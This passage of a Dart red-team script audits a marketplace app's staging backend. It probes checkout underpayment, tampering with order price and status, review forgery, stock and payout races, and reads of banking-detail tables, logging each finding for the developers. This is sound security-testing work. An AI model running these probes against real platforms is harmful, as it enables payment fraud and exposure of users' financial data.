  final ocr = await edge('ingest-ocr-reservation', {
    'live_id': '00000000-0000-0000-0000-000000000001',
    'ocr_line_hash': 'abcdefghij',
    'detected_at': DateTime.now().toUtc().toIso8601String(),
    'ref_number': 1,
  }, asAnon: true);
  rec('ingest-ocr-reservation', 'anon no device token', 'anon', ocr);

  final ocr2 = await edge(
    'ingest-ocr-reservation',
    {
      'live_id': '00000000-0000-0000-0000-000000000001',
      'ocr_line_hash': 'abcdefghij',
      'detected_at': DateTime.now().toUtc().toIso8601String(),
      'ref_number': 1,
    },
    asAnon: true,
    extra: {'x-device-token': '00000000-0000-0000-0000-000000000001'},
  );
  rec('ingest-ocr-reservation', 'anon fake device token', 'anon', ocr2);

  final pair = await edge('ps-pairing-claim', {
    'code': '000000',
    'device_id': 'rt-e',
  }, asAnon: true);
  rec('ps-pairing-claim', 'code 000000', 'anon', pair);

  final sms = await edge('send-sms-bulkgate', {
    'user': {'phone': '+351910000000'},
    'sms': {'otp': '123456'},
  }, asAnon: true);
  rec('send-sms-bulkgate', 'anon OTP webhook', 'anon', sms);

  final nuke = await edge('delete-test-account', {'confirm': 'APAGAR TUDO'}, jwt: buyerJwt);
  rec('delete-test-account', 'buyer confirm phrase', 'buyer', nuke);

  final meta = await edge('meta-data-deletion', {'user_id': sellerId}, asAnon: true);
  rec('meta-data-deletion', 'anon other user', 'anon', meta);
}

Future<void> pass1Storage() async {
  hit('STORAGE');
  final buckets = await req(
    'GET',
    '$base/storage/v1/bucket',
    headers: anonH(),
  );
  rec('storage', 'list buckets anon', 'anon', buckets);

  final bucketsB = await req(
    'GET',
    '$base/storage/v1/bucket',
    headers: hdr(buyerJwt),
  );
  rec('storage', 'list buckets buyer', 'buyer', bucketsB);

  final names = <String>[];
  for (final src in [buckets['body'], bucketsB['body']]) {
    if (src is List) {
      for (final b in src) {
        if (b is Map && b['name'] != null) names.add('${b['name']}');
      }
    }
  }
  for (final b in {...names, 'chat_media', 'product_media', 'avatars', 'dispute_proofs', 'returns'}) {
    final list = await req(
      'POST',
      '$base/storage/v1/object/list/$b',
      headers: hdr(freshJwt),
      body: {'prefix': '', 'limit': 20},
    );
    rec('storage:$b', 'list root as fresh', 'fresh', list);
    if (list['body'] is List && (list['body'] as List).isNotEmpty) {
      notes.add('storage_list $b n=${(list['body'] as List).length}');
      // try first object
      final first = (list['body'] as List).first;
      if (first is Map && first['name'] != null) {
        final path = '${first['name']}';
        final get = await req(
          'GET',
          '$base/storage/v1/object/$b/$path',
          headers: hdr(freshJwt),
        );
        rec('storage:$b', 'GET object $path', 'fresh', {
          'http': get['http'],
          'raw': 'len=${'${get['raw']}'.length}',
          'body': get['http'],
        });
      }
    }
  }
}

Future<Map<String, String>> fixtureProduct({
  required int qty,
  required double price,
  String title = 'RT-E item',
}) async {
  final r = await rest('POST', 'products', jwt: sellerJwt, body: {
    'seller_id': sellerId,
    'title': '$title ${DateTime.now().millisecondsSinceEpoch}',
    'price': price,
    'quantity': qty,
    'list_on_marketplace': true,
    'available_for_live': false,
    'category': 'Outros',
    'condition': 'Bom',
    'description': tag,
    'image_urls': [],
  });
  rec('products', 'fixture insert qty=$qty price=$price', 'seller', r);
  final row = firstRow(r['body']);
  if (row is! Map || row['id'] == null) {
    // service fallback for missing columns
    final r2 = await rest('POST', 'products', asSvc: true, body: {
      'seller_id': sellerId,
      'title': '$title svc ${DateTime.now().millisecondsSinceEpoch}',
      'price': price,
      'quantity': qty,
      'list_on_marketplace': true,
      'available_for_live': false,
      'description': tag,
      'image_urls': [],
    });
    final row2 = firstRow(r2['body']);
    if (row2 is Map && row2['id'] != null) {
      created['products']!.add('${row2['id']}');
      return {'id': '${row2['id']}', 'via': 'service'};
    }
    throw StateError('fixture product failed ${r['raw']} ${r2['raw']}');
  }
  created['products']!.add('${row['id']}');
  return {'id': '${row['id']}', 'via': 'seller_jwt'};
}

Future<Map<String, dynamic>?> insertOrder({
  required String jwt,
  required String bid,
  required String pid,
  required Object price,
  required Object qty,
  String status = 'reserva_pendente',
  String ship = 'hand',
  String pay = 'Pagamento na App',
  Map<String, dynamic>? extra,
}) async {
  final body = <String, dynamic>{
    'product_id': pid,
    'buyer_id': bid,
    'seller_id': sellerId,
    'price_total': price,
    'status': status,
    'payment_method': pay,
    'shipping_method': ship,
    'quantity': qty,
    'is_reservation': true,
    'notes': tag,
    ...?extra,
  };
  final r = await rest('POST', 'orders', jwt: jwt, body: body);
  rec('orders', 'INSERT $status qty=$qty price=$price', bid == buyerId ? 'buyer' : 'fresh', r);
  final row = firstRow(r['body']);
  if (row is Map && row['id'] != null) {
    created['orders']!.add('${row['id']}');
    return Map<String, dynamic>.from(row);
  }
  return null;
}

Future<void> pass2Finance() async {
  hit('PRICE / CONTRACT');
  hit('QUANTITY AUTHORITY');
  hit('CATALOG');
  hit('ORDER FSM');
  hit('BAG / CART');
  hit('WALLET');
  hit('LEDGER');
  hit('STOCK');
  hit('SETTLE');
  hit('RETURN PATH');
  hit('PARTIAL REFUNDS');
  hit('OFFERS / PROPOSALS');
  hit('BUNDLES / DISCOUNTS');
  hit('REVIEWS');

  final p = await fixtureProduct(qty: 5, price: 12.0, title: 'RT-E price');
  final pid = p['id']!;

  // Buyer inserts order with underpriced total + high qty
  final oLow = await insertOrder(
    jwt: buyerJwt,
    bid: buyerId,
    pid: pid,
    price: 0.50,
    qty: 99,
  );
  invariantResults.add({
    'id': 'B_client_qty_price_on_insert',
    'order': oLow,
    'asked_qty': 99,
    'asked_price': 0.50,
  });

  if (oLow != null) {
    final cq = numOf(oLow['contract_qty']);
    final q = numOf(oLow['quantity']);
    final unit = numOf(oLow['contract_unit_cents']);
    if ((q ?? 0) >= 99) {
      finding(
        id: 'RT-E-QTY-INSERT',
        sev: 'P1',
        title: 'Buyer define qty 99 no INSERT da order',
        actor: 'buyer JWT',
        pre: 'produto stock 5',
        repro: 'POST /orders quantity=99',
        impact: 'Qty autoritativa do cliente se o checkout a honrar.',
        evidence: {'row': oLow},
      );
    }

    // Checkout with client amount 50 cents
    final chk = await edge('create-payment-intent', {
      'amount': 50,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'order_id': oLow['id'],
      'product_id': pid,
      'quantity': 1,
      'item_price': 0.5,
      'shipping_method': 'hand',
      'prize_shipping': false,
    }, jwt: buyerJwt);
    rec('CHECKOUT', 'underpay qty99 order', 'buyer', chk);
    stripeResults.add({'probe': 'underpay_qty99', 'res': chk['raw'], 'http': chk['http']});
    final amt = _serverAmount(chk['body']);
    invariantResults.add({
      'id': 'A_stripe_quote_vs_client',
      'client_cents': 50,
      'server_cents': amt,
      'http': chk['http'],
    });
    if ((chk['http'] as int) < 300 && amt != null && amt <= 50) {
      finding(
        id: 'RT-E-PRICE-UNDER',
        sev: 'P0',
        title: 'Checkout cobra montante cliente (sub-preço)',
        actor: 'buyer',
        pre: 'order existente',
        repro: 'create-payment-intent amount=50 com item 12€',
        impact: 'Pagar menos que o contrato.',
        evidence: {'http': chk['http'], 'raw': chk['raw'], 'server_cents': amt},
      );
    }

    // Checkout claiming prize
    final prize = await edge('create-payment-intent', {
      'buyer_id': buyerId,
      'order_id': oLow['id'],
      'shipping_method': 'carrier',
      'prize_shipping': true,
    }, jwt: buyerJwt);
    rec('CHECKOUT', 'prize_shipping on normal order', 'buyer', prize);
    final pamt = _serverAmount(prize['body']);
    if ((prize['http'] as int) < 300 && pamt != null && pamt < 1200) {
      finding(
        id: 'RT-E-PRIZE-BYPASS',
        sev: 'P0',
        title: 'prize_shipping reduz checkout a portes',
        actor: 'buyer',
        pre: 'order não-rifa',
        repro: 'create-payment-intent prize_shipping=true',
        impact: 'Pagar só portes em vez do artigo.',
        evidence: {'http': prize['http'], 'raw': prize['raw']},
      );
    }

    // Patch qty after insert
    final patchQ = await rest(
      'PATCH',
      'orders',
      jwt: buyerJwt,
      qs: 'id=eq.${oLow['id']}',
      body: {'quantity': 1, 'price_total': 0.5, 'contract_qty': 1, 'contract_unit_cents': 1},
    );
    rec('orders', 'PATCH qty/contract after insert', 'buyer', patchQ);
    final after = await rest(
      'GET',
      'orders',
      asSvc: true,
      qs: 'id=eq.${oLow['id']}&select=id,quantity,contract_qty,contract_unit_cents,price_total,status',
    );
    rec('orders', 'observe after patch', 'service_observe', after);
    final arow = firstRow(after['body']);
    if (arow is Map && numOf(arow['contract_unit_cents']) == 1) {
      finding(
        id: 'RT-E-CONTRACT-PATCH',
        sev: 'P0',
        title: 'Buyer altera contract_unit_cents',
        actor: 'buyer JWT',
        pre: 'order própria',
        repro: 'PATCH /orders contract_unit_cents=1',
        impact: 'Contrato financeiro reescrito pelo cliente.',
        evidence: {'row': arow},
      );
    }

    // Catalog change after order — checkout should keep sealed
    await rest('PATCH', 'products', jwt: sellerJwt, qs: 'id=eq.$pid', body: {'price': 1.00});
    final chk2 = await edge('create-payment-intent', {
      'buyer_id': buyerId,
      'order_id': oLow['id'],
      'shipping_method': 'hand',
    }, jwt: buyerJwt);
    rec('CHECKOUT', 'after catalog price drop', 'buyer', chk2);
    stripeResults.add({'probe': 'catalog_drop', 'res': chk2['raw'], 'http': chk2['http']});
    invariantResults.add({
      'id': 'K_catalog_not_retroactive',
      'server_cents': _serverAmount(chk2['body']),
      'http': chk2['http'],
    });
  }

  // FSM: buyer patch to pago / concluido / enviado
  final oFsm = await insertOrder(
    jwt: buyerJwt,
    bid: buyerId,
    pid: pid,
    price: 12,
    qty: 1,
    status: 'reserva_pendente',
  );
  if (oFsm != null) {
    for (final st in ['pago', 'enviado', 'concluido', 'entregue', 'cancelado', 'premio_rifa']) {
      final r = await rest(
        'PATCH',
        'orders',
        jwt: buyerJwt,
        qs: 'id=eq.${oFsm['id']}',
        body: {'status': st},
      );
      rec('ORDER FSM', 'buyer PATCH status=$st', 'buyer', r);
    }
    final obs = await rest(
      'GET',
      'orders',
      asSvc: true,
      qs: 'id=eq.${oFsm['id']}&select=id,status',
    );
    final st = firstRow(obs['body']);
    final now = st is Map ? '${st['status']}'.toLowerCase() : '';
    if (now == 'pago' || now == 'concluido' || now == 'enviado') {
      finding(
        id: 'RT-E-FSM-SKIP',
        sev: 'P0',
        title: 'Buyer força estado terminal $now',
        actor: 'buyer JWT',
        pre: 'order reserva_pendente',
        repro: 'PATCH /orders status=$now',
        impact: 'Venda/saldo sem pagamento.',
        evidence: {'row': st},
      );
    }

    // Seller marks pago (MB WAY path) — expected maybe allowed
    final sPay = await rest(
      'PATCH',
      'orders',
      jwt: sellerJwt,
      qs: 'id=eq.${oFsm['id']}',
      body: {'status': 'pago', 'payment_method': 'MB WAY'},
    );
    rec('ORDER FSM', 'seller PATCH pago MB WAY', 'seller', sPay);
    final obs2 = await rest(
      'GET',
      'orders',
      asSvc: true,
      qs: 'id=eq.${oFsm['id']}&select=id,status,amount_paid_cents',
    );
    final st2 = firstRow(obs2['body']);
    invariantResults.add({
      'id': 'F_offplatform_pago',
      'row': st2,
      'seller_patch_http': sPay['http'],
    });
    if (st2 is Map && '${st2['status']}'.toLowerCase() == 'pago') {
      // Check wallet mint
      final w = await rest(
        'GET',
        'wallets',
        asSvc: true,
        qs: 'id=eq.$sellerId&select=id,balance',
      );
      rec('WALLET', 'observe seller after off-platform pago', 'service_observe', w);
      notes.add('seller_self_pago_status=${st2['status']} wallet=${w['raw']}');
    }
  }

  // Reviews forge
  final rev = await rest('POST', 'reviews', jwt: freshJwt, body: {
    'reviewer_id': freshId,
    'reviewee_id': sellerId,
    'rating': 5,
    'comment': tag,
    'order_id': oFsm?['id'],
    'role': 'buyer',
  });
  rec('reviews', 'INSERT without paid order', 'fresh', rev);
  if ((rev['http'] as int) < 300) {
    finding(
      id: 'RT-E-REV-FORGE',
      sev: 'P1',
      title: 'Review sem transacção paga',
      actor: 'fresh JWT',
      pre: 'sem order paga',
      repro: 'POST /reviews',
      impact: 'Manipulação reputacional.',
      evidence: {'http': rev['http'], 'raw': rev['raw']},
    );
  }

  final rev2 = await rest('POST', 'reviews', jwt: buyerJwt, body: {
    'reviewer_id': sellerId,
    'reviewee_id': buyerId,
    'rating': 1,
    'comment': tag,
  });
  rec('reviews', 'INSERT as other reviewer_id', 'buyer', rev2);

  // Bundle discounts as buyer
  final bun = await rest('POST', 'seller_bundle_discounts', jwt: buyerJwt, body: {
    'seller_id': sellerId,
    'enabled': true,
    'tier_2_pct': 90,
  });
  rec('BUNDLES', 'buyer writes seller discount', 'buyer', bun);

  final bun2 = await rest(
    'PATCH',
    'seller_bundle_discounts',
    jwt: buyerJwt,
    qs: 'seller_id=eq.$sellerId',
    body: {'tier_2_pct': 90, 'enabled': true},
  );
  rec('BUNDLES', 'buyer PATCH seller discount', 'buyer', bun2);
}

int? _serverAmount(dynamic body) {
  if (body is Map) {
    return numOf(body['server_amount_cents'] ?? body['amount_total']);
  }
  return null;
}

Future<void> pass3Races() async {
  hit('CONCURRENCY');
  hit('LIVE RESERVATIONS');
  hit('WAITLIST / QUEUE');

  final p = await fixtureProduct(qty: 1, price: 8.0, title: 'RT-E stock1');
  final pid = p['id']!;

  // Two orders for last unit, two buyers
  final futs = <Future<Map<String, dynamic>?>>[];
  futs.add(insertOrder(jwt: buyerJwt, bid: buyerId, pid: pid, price: 8, qty: 1));
  futs.add(insertOrder(jwt: freshJwt, bid: freshId, pid: pid, price: 8, qty: 1));
  final orders = await Future.wait(futs);
  raceResults.add({
    'race': 'two_orders_stock1',
    'created': orders.where((e) => e != null).length,
    'ids': orders.map((e) => e?['id']).toList(),
    'qtys': orders.map((e) => e?['quantity']).toList(),
  });

  final alive = orders.whereType<Map<String, dynamic>>().toList();
  if (alive.length >= 2) {
    // Dual checkout sessions
    final sessions = await Future.wait([
      for (final o in alive)
        edge('create-payment-intent', {
          'buyer_id': o['buyer_id'],
          'order_id': o['id'],
          'shipping_method': 'hand',
        }, jwt: '${o['buyer_id']}' == buyerId ? buyerJwt : freshJwt),
    ]);
    raceResults.add({
      'race': 'two_checkout_sessions_stock1',
      'https': sessions.map((s) => s['http']).toList(),
      'raws': sessions.map((s) => clip('${s['raw']}', 220)).toList(),
      'amounts': sessions.map((s) => _serverAmount(s['body'])).toList(),
    });
    stripeResults.addAll([
      for (var i = 0; i < sessions.length; i++)
        {
          'probe': 'stock1_session_$i',
          'http': sessions[i]['http'],
          'raw': sessions[i]['raw'],
        }
    ]);
    final okSessions = sessions.where((s) => (s['http'] as int) < 300 && _serverAmount(s['body']) != null).length;
    invariantResults.add({
      'id': 'D_stock1_two_sessions',
      'sessions_created': okSessions,
      'orders_created': alive.length,
      'note': 'SESSION CRIADA ≠ CAPTURA. Captura líquida requer Stripe TEST pay.',
    });
  }

  // Repeat 10x order insert race on a new stock=1
  var doubleOk = 0;
  for (var i = 0; i < 10; i++) {
    final px = await fixtureProduct(qty: 1, price: 7.0, title: 'RT-E race$i');
    final a = insertOrder(jwt: buyerJwt, bid: buyerId, pid: px['id']!, price: 7, qty: 1);
    final b = insertOrder(jwt: freshJwt, bid: freshId, pid: px['id']!, price: 7, qty: 1);
    final pair = await Future.wait([a, b]);
    final n = pair.where((e) => e != null).length;
    if (n >= 2) doubleOk++;
  }
  raceResults.add({
    'race': '10x_two_orders_stock1',
    'both_accepted': doubleOk,
    'note': 'accepted INSERT ≠ two paid sales',
  });

  // Dual refund on same order (will 403/404 mostly)
  if (created['orders']!.isNotEmpty) {
    final oid = created['orders']!.last;
    final rfs = await Future.wait([
      edge('refund-order', {'order_id': oid}, jwt: sellerJwt),
      edge('refund-order', {'order_id': oid}, jwt: sellerJwt),
    ]);
    raceResults.add({
      'race': 'two_refunds',
      'https': rfs.map((e) => e['http']).toList(),
      'raws': rfs.map((e) => clip('${e['raw']}', 180)).toList(),
    });
  }

  // Dual payout
  final pays = await Future.wait([
    edge('create-connect-account', {
      'amount': 100,
      'idempotency_key': '${tag}_pay_a',
    }, jwt: sellerJwt),
    edge('create-connect-account', {
      'amount': 100,
      'idempotency_key': '${tag}_pay_b',
    }, jwt: sellerJwt),
  ]);
  raceResults.add({
    'race': 'two_payouts_different_keys',
    'https': pays.map((e) => e['http']).toList(),
    'raws': pays.map((e) => clip('${e['raw']}', 180)).toList(),
  });
  rec('PAYOUT', 'dual different keys', 'seller', pays.first);
  rec('PAYOUT', 'dual different keys b', 'seller', pays.last);

  final sameKey = await Future.wait([
    edge('create-connect-account', {
      'amount': 100,
      'idempotency_key': '${tag}_pay_same',
    }, jwt: sellerJwt),
    edge('create-connect-account', {
      'amount': 100,
      'idempotency_key': '${tag}_pay_same',
    }, jwt: sellerJwt),
  ]);
  raceResults.add({
    'race': 'two_payouts_same_key',
    'https': sameKey.map((e) => e['http']).toList(),
    'raws': sameKey.map((e) => clip('${e['raw']}', 180)).toList(),
  });

  // Dual reviews
  final revs = await Future.wait([
    rest('POST', 'reviews', jwt: buyerJwt, body: {
      'reviewer_id': buyerId,
      'reviewee_id': sellerId,
      'rating': 5,
      'comment': '$tag a',
    }),
    rest('POST', 'reviews', jwt: buyerJwt, body: {
      'reviewer_id': buyerId,
      'reviewee_id': sellerId,
      'rating': 5,
      'comment': '$tag b',
    }),
  ]);
  raceResults.add({
    'race': 'two_reviews',
    'https': revs.map((e) => e['http']).toList(),
    'raws': revs.map((e) => clip('${e['raw']}', 160)).toList(),
  });

  // Live reservation race if an active live exists
  final lives = await rest(
    'GET',
    'lives',
    asSvc: true,
    qs: 'select=id,seller_id,status,is_active&status=eq.live&is_active=eq.true&limit=1',
  );
  rec('LIVE', 'observe active live (no new live started)', 'service_observe', lives);
  final live = firstRow(lives['body']);
  if (live is Map && live['id'] != null) {
    final lid = '${live['id']}';
    final items = await rest(
      'GET',
      'live_items',
      asSvc: true,
      qs: 'live_id=eq.$lid&select=id,product_id,price,status&limit=3',
    );
    final li = firstRow(items['body']);
    if (li is Map && li['id'] != null) {
      hit('LIVE ITEMS');
      final rr = await Future.wait([
        rest('POST', 'live_reservation_requests', jwt: buyerJwt, body: {
          'live_id': lid,
          'live_item_id': li['id'],
          'buyer_id': buyerId,
          'seller_id': live['seller_id'],
          'requested_qty': 1,
          'source': 'fleaber_live',
          'status': 'pending',
        }),
        rest('POST', 'live_reservation_requests', jwt: freshJwt, body: {
          'live_id': lid,
          'live_item_id': li['id'],
          'buyer_id': freshId,
          'seller_id': live['seller_id'],
          'requested_qty': 1,
          'source': 'fleaber_live',
          'status': 'pending',
        }),
      ]);
      raceResults.add({
        'race': 'two_live_reservations',
        'https': rr.map((e) => e['http']).toList(),
        'raws': rr.map((e) => clip('${e['raw']}', 160)).toList(),
      });
    }
  } else {
    notes.add('no_active_live — did not start a live (QA rule)');
  }

  // Bag checkout two sellers
  final p2 = await fixtureProduct(qty: 2, price: 9.0, title: 'RT-E bagB');
  // Need another seller product — use existing other seller if any
  final otherP = await rest(
    'GET',
    'products',
    asSvc: true,
    qs: 'seller_id=neq.$sellerId&select=id,seller_id,price,quantity&quantity=gte.1&limit=1',
  );
  final oA = await insertOrder(jwt: buyerJwt, bid: buyerId, pid: pid, price: 8, qty: 1);
  Map<String, dynamic>? oB;
  final op = firstRow(otherP['body']);
  if (op is Map) {
    oB = await insertOrder(
      jwt: buyerJwt,
      bid: buyerId,
      pid: '${op['id']}',
      price: op['price'] ?? 9,
      qty: 1,
    );
    // insertOrder forces sellerId lab — may fail product/seller guard. Try explicit.
  }
  if (oA != null) {
    final bag = await edge('create-payment-intent', {
      'buyer_id': buyerId,
      'order_id': oA['id'],
      'bag_checkout': true,
      'shipping_method': 'carrier',
      'bag_lines': [
        {'order_id': oA['id']},
        if (oB != null) {'order_id': oB['id']},
        {'order_id': oA['id']}, // duplicate line
      ],
    }, jwt: buyerJwt);
    rec('BAG', 'duplicate line + maybe multi seller', 'buyer', bag);
    stripeResults.add({'probe': 'bag_hostile', 'http': bag['http'], 'raw': bag['raw']});
  }

  unused(p2);
}

Future<void> pass2Variants() async {
  // Shipping method garbage / aliases
  final p = await fixtureProduct(qty: 2, price: 10, title: 'RT-E ship');
  final o = await insertOrder(jwt: buyerJwt, bid: buyerId, pid: p['id']!, price: 10, qty: 1);
  if (o == null) return;
  for (final m in [
    'hand',
    'carrier',
    'HAND',
    ' hand ',
    'gratis',
    'free',
    '€0',
    'entrega em mão (€0.00)',
    '',
    'transportadora',
  ]) {
    final r = await edge('create-payment-intent', {
      'buyer_id': buyerId,
      'order_id': o['id'],
      'shipping_method': m,
      'shipping': 0,
    }, jwt: buyerJwt);
    rec('CHECKOUT', 'shipping_method="$m"', 'buyer', r);
  }

  // Cross IDs: buyer checkout seller's order
  final sellerOrders = await rest(
    'GET',
    'orders',
    asSvc: true,
    qs: 'buyer_id=eq.$sellerId&select=id,status&limit=1',
  );
  final so = firstRow(sellerOrders['body']);
  if (so is Map) {
    final x = await edge('create-payment-intent', {
      'buyer_id': buyerId,
      'order_id': so['id'],
      'shipping_method': 'hand',
    }, jwt: buyerJwt);
    rec('CHECKOUT', 'pay someone else order', 'buyer', x);
  }

  // Checkout with mismatched product_id of another product
  final pOther = await fixtureProduct(qty: 1, price: 3, title: 'RT-E otherprod');
  final x2 = await edge('create-payment-intent', {
    'buyer_id': buyerId,
    'order_id': o['id'],
    'product_id': pOther['id'],
    'shipping_method': 'hand',
  }, jwt: buyerJwt);
  rec('CHECKOUT', 'mismatched product_id', 'buyer', x2);

  // Negative / huge qty patch
  for (final q in [-1, 0, 0.5, 1e9, 1]) {
    final r = await rest(
      'PATCH',
      'orders',
      jwt: buyerJwt,
      qs: 'id=eq.${o['id']}',
      body: {'quantity': q},
    );
    rec('QUANTITY AUTHORITY', 'PATCH quantity=$q', 'buyer', r);
  }

  // Offers table if exists
  final off = await rest('POST', 'product_offers', jwt: buyerJwt, body: {
    'product_id': p['id'],
    'buyer_id': buyerId,
    'amount': 0.01,
    'status': 'accepted',
  });
  rec('OFFERS', 'INSERT accepted 0.01', 'buyer', off);

  // Banking oracle
  hit('PRIVACY');
  for (final t in [
    'seller_banking_details',
    'seller_payout_details',
    'banking_details',
    'payout_details',
  ]) {
    final r = await rest('GET', t, jwt: freshJwt, qs: 'select=*&limit=20');
    rec(t, 'SELECT *', 'fresh', r);
    if (r['http'] == 200 && r['body'] is List && (r['body'] as List).isNotEmpty) {
      finding(
        id: 'RT-E-BANK-$t',
        sev: 'P1',
        title: 'JWT lê dados bancários ($t)',
        actor: 'fresh',
        pre: 'tabela acessível',
        repro: 'GET /$t',
        impact: 'PII financeiro.',
        evidence: {'http': r['http'], 'n': (r['body'] as List).length, 'raw': clip('${r['raw']}', 200)},
      );
    }
  }
}

Future<void> observeWalletAndStock() async {
  final wS = await rest('GET', 'wallets', asSvc: true, qs: 'id=eq.$sellerId&select=*');
  final wB = await rest('GET', 'wallets', asSvc: true, qs: 'id=eq.$buyerId&select=*');
  rec('WALLET', 'observe seller', 'service_observe', wS);
  rec('WALLET', 'observe buyer', 'service_observe', wB);

  if (created['products']!.isNotEmpty) {
    final ids = created['products']!.take(8).join(',');
    final st = await rest(
      'GET',
      'products',
      asSvc: true,
      qs: 'id=in.($ids)&select=id,quantity,price,is_sold',
    );
    rec('STOCK', 'observe fixture products', 'service_observe', st);
  }
}

Future<void> cleanup() async {
  // Cancel leftover pending orders we created; do not delete lab users' history wholesale.
  for (final oid in created['orders']!) {
    await rest(
      'PATCH',
      'orders',
      asSvc: true,
      qs: 'id=eq.$oid',
      body: {'status': 'cancelado', 'notes': '$tag cleanup'},
    );
  }
  // Do not delete products that might be referenced; mark unlist.
  for (final pid in created['products']!) {
    await rest(
      'PATCH',
      'products',
      asSvc: true,
      qs: 'id=eq.$pid',
      body: {'list_on_marketplace': false, 'quantity': 0},
    );
  }
}

void main() async {
  final frozenAt = DateTime.now().toUtc().toIso8601String();
  await boot();

  // PASS 1
  final catalog = await openApiTables();
  final rpcs = catalog
      .where((e) => e.startsWith('rpc:'))
      .map((e) => e.substring(4))
      .toList();
  await pass1Rls();
  await pass1Rpc(await rpcNamesFromOpenApi());
  await pass1Edge();
  await pass1Storage();

  // PASS 2
  await pass2Finance();
  await pass2Variants();

  // PASS 3
  await pass3Races();
  await observeWalletAndStock();

  await cleanup();

  unused(rpcs);
  unused(frozenAt);

  final outDir = Directory('tool/redteam_indep_e_20260829');
  outDir.createSync(recursive: true);
  final raw = {
    'auditor': 'independent_blind_redteam_E',
    'project': stagingRef,
    'stripe': 'TEST_only',
    'production_touched': false,
    'fase4_started': false,
    'frozen_at': DateTime.now().toUtc().toIso8601String(),
    'surfaces': surfacesHit,
    'findings': findings,
    'matrix': matrix,
    'races': raceResults,
    'stripe_probes': stripeResults,
    'invariants': invariantResults,
    'notes': notes,
    'created_fixtures': created,
    'rpc_count_openapi': (await rpcNamesFromOpenApi()).length,
  };
  File('${outDir.path}/frozen_raw.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert(raw),
  );
  stdout.writeln('FINDINGS=${findings.length}');
  stdout.writeln('MATRIX=${matrix.length}');
  stdout.writeln('RACES=${raceResults.length}');
  for (final f in findings) {
    stdout.writeln('${f['severity']} ${f['id']} ${f['title']}');
  }
  stdout.writeln('WROTE ${outDir.path}/frozen_raw.json');
}
